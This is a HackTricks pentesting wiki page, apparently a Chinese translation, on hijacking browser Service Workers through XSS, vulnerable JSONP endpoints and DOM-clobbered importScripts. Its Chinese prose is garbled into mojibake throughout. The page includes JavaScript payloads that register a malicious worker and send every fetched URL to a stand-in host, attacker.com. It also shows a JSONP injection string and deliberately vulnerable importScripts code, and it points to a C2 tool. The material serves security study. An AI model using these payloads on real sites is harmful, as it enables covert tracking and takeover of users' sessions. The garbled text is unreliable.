# æ»¥ç”¨Service Workers



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## åŸºæœ¬ä¿¡æ¯

Service Workeræ˜¯ä¸€ä¸ª**è„šæœ¬**ï¼Œæ‚¨çš„æµè§ˆå™¨åœ¨**åå°è¿è¡Œ**ï¼Œä¸ç½‘é¡µåˆ†å¼€ï¼Œä¸ºä¸éœ€è¦ç½‘é¡µæˆ–ç”¨æˆ·äº¤äº’çš„åŠŸèƒ½æ‰“å¼€äº†å¤§é—¨ã€‚([æ›´å¤šå…³äºä»€ä¹ˆæ˜¯Service Workerçš„ä¿¡æ¯](https://developers.google.com/web/fundamentals/primers/service-workers))ã€‚\
ç„¶åï¼Œæ‚¨å¯ä»¥é€šè¿‡åœ¨**æ˜“å—æ”»å‡»çš„**Web**åŸŸ**ä¸­çš„**å—å®³è€…ä¼šè¯**å†…**åˆ›å»º/ä¿®æ”¹Service Workers**æ¥æ»¥ç”¨Service Workersï¼Œä»è€Œæˆäºˆæ”»å‡»è€…å¯¹å—å®³è€…å°†åœ¨è¯¥åŸŸä¸­åŠ è½½çš„**æ‰€æœ‰é¡µé¢**çš„æ§åˆ¶æƒã€‚

### æ£€æŸ¥ç°æœ‰çš„SWs

æ‚¨å¯ä»¥åœ¨**å¼€å‘è€…å·¥å…·**çš„**åº”ç”¨ç¨‹åº**é€‰é¡¹å¡çš„**Service Workers**å­—æ®µä¸­æŸ¥çœ‹å®ƒä»¬ã€‚æ‚¨è¿˜å¯ä»¥æŸ¥çœ‹[chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)ã€‚

### æ¨é€é€šçŸ¥

å¦‚æœå—å®³è€…æ²¡æœ‰æˆäºˆ**æ¨é€é€šçŸ¥æƒé™**ï¼Œåˆ™Service Workerå°†**æ— æ³•ä»æœåŠ¡å™¨æ¥æ”¶é€šä¿¡ï¼Œé™¤éç”¨æˆ·å†æ¬¡è®¿é—®æ”»å‡»è€…é¡µé¢**ã€‚è¿™å°†**é˜²æ­¢**ä¾‹å¦‚ï¼Œä¸è®¿é—®æ”»å‡»è€…ç½‘é¡µçš„æ‰€æœ‰é¡µé¢ä¿æŒå¯¹è¯ï¼Œå› æ­¤å¦‚æœæ‰¾åˆ°äº†æ¼æ´ï¼ŒService Workerå¯ä»¥æ¥æ”¶å¹¶æ‰§è¡Œå®ƒã€‚\
ç„¶è€Œï¼Œå¦‚æœå—å®³è€…**æˆäºˆæ¨é€é€šçŸ¥æƒé™ï¼Œè¿™å¯èƒ½å­˜åœ¨é£é™©**ã€‚

## æ”»å‡»åˆ›å»ºService Worker

ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ‚¨éœ€è¦æ‰¾åˆ°ï¼š

* ä¸€ç§**ä¸Šä¼ ä»»æ„JSæ–‡ä»¶**åˆ°æœåŠ¡å™¨å¹¶**åŠ è½½æœåŠ¡å·¥ä½œè€…çš„XSS**çš„æ–¹æ³•
* ä¸€ä¸ª**æ˜“å—æ”»å‡»çš„JSONPè¯·æ±‚**ï¼Œæ‚¨å¯ä»¥**æ“çºµè¾“å‡ºï¼ˆä½¿ç”¨ä»»æ„JSä»£ç ï¼‰**å’Œä¸€ä¸ª**XSS**æ¥**åŠ è½½å¸¦æœ‰æ¶æ„Service Workerçš„JSONP**ã€‚

åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘å°†ä»‹ç»ä¸€æ®µä»£ç ï¼Œç”¨äº**æ³¨å†Œä¸€ä¸ªæ–°çš„Service Worker**ï¼Œè¯¥Service Workerå°†ä¾¦å¬`fetch`äº‹ä»¶ï¼Œå¹¶å°†**æ¯ä¸ªè·å–çš„URLå‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨**ï¼ˆè¿™æ˜¯æ‚¨éœ€è¦**ä¸Šä¼ **åˆ°**æœåŠ¡å™¨**æˆ–é€šè¿‡**æ˜“å—æ”»å‡»çš„JSONP**å“åº”åŠ è½½çš„ä»£ç ï¼‰ï¼š
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
ä»¥ä¸‹æ˜¯å°†**æ³¨å†ŒæœåŠ¡å·¥ä½œè€…**çš„ä»£ç ï¼ˆæ‚¨åº”è¯¥èƒ½å¤Ÿé€šè¿‡æ»¥ç”¨**XSS**æ¥æ‰§è¡Œçš„ä»£ç ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†å‘**æ”»å‡»è€…**çš„æœåŠ¡å™¨å‘é€ä¸€ä¸ª**GET**è¯·æ±‚ï¼Œé€šçŸ¥æœåŠ¡å·¥ä½œè€…çš„**æ³¨å†Œ**æ˜¯å¦æˆåŠŸï¼š
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
åœ¨æ»¥ç”¨æ˜“å—æ”»å‡»çš„JSONPç«¯ç‚¹çš„æƒ…å†µä¸‹ï¼Œæ‚¨åº”è¯¥å°†å€¼æ”¾åœ¨`var sw`å†…ã€‚ä¾‹å¦‚ï¼š
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
æœ‰ä¸€ä¸ªä¸“é—¨ç”¨äºåˆ©ç”¨Service Workersçš„C2ï¼Œåä¸º[Shadow Workers](https://shadow-workers.github.io)ï¼Œè¿™å°†éå¸¸æœ‰ç”¨æ¥æ»¥ç”¨è¿™äº›æ¼æ´ã€‚

åœ¨XSSæƒ…å†µä¸‹ï¼Œ24å°æ—¶ç¼“å­˜æŒ‡ä»¤é™åˆ¶ç¡®ä¿æ¶æ„æˆ–è¢«å…¥ä¾µçš„SWå°†åœ¨XSSæ¼æ´ä¿®å¤ä¹‹å‰æœ€å¤šå­˜æ´»24å°æ—¶ï¼ˆå‡è®¾å®¢æˆ·ç«¯åœ¨çº¿ï¼‰ã€‚ç½‘ç«™è¿è¥è€…å¯ä»¥é€šè¿‡è®¾ç½®è¾ƒä½çš„SWè„šæœ¬TTLæ¥ç¼©å°æ¼æ´çª—å£ã€‚æˆ‘ä»¬è¿˜é¼“åŠ±å¼€å‘äººå‘˜[æ„å»ºä¸€ä¸ªæ–­å¼€è¿æ¥çš„SW](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)ã€‚

## é€šè¿‡DOM Clobberingæ»¥ç”¨SWä¸­çš„`importScripts`

ä»Service Workerä¸­è°ƒç”¨çš„å‡½æ•°**`importScripts`**å¯ä»¥ä»ä¸åŒçš„åŸŸå¯¼å…¥è„šæœ¬ã€‚å¦‚æœä½¿ç”¨**æ”»å‡»è€…å¯ä»¥ä¿®æ”¹çš„å‚æ•°**è°ƒç”¨æ­¤å‡½æ•°ï¼Œä»–å°†èƒ½å¤Ÿä»è‡ªå·±çš„åŸŸå¯¼å…¥JSè„šæœ¬å¹¶è·å–XSSã€‚

**è¿™ç”šè‡³å¯ä»¥ç»•è¿‡CSPä¿æŠ¤ã€‚**

**æ¼æ´ä»£ç ç¤ºä¾‹ï¼š**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### ä½¿ç”¨DOM Clobbering

æœ‰å…³DOM Clobberingçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

å¦‚æœSWç”¨äºè°ƒç”¨**`importScripts`**çš„URL/åŸŸå**ä½äºHTMLå…ƒç´ å†…**ï¼Œåˆ™å¯ä»¥é€šè¿‡DOM Clobberingè¿›è¡Œä¿®æ”¹ï¼Œä½¿SWä»æ‚¨è‡ªå·±çš„åŸŸåŠ è½½è„šæœ¬ã€‚

æœ‰å…³æ­¤ç¤ºä¾‹ï¼Œè¯·æŸ¥çœ‹å‚è€ƒé“¾æ¥ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æŸ¥æ‰¾æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTricksè¡£ç‰©**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
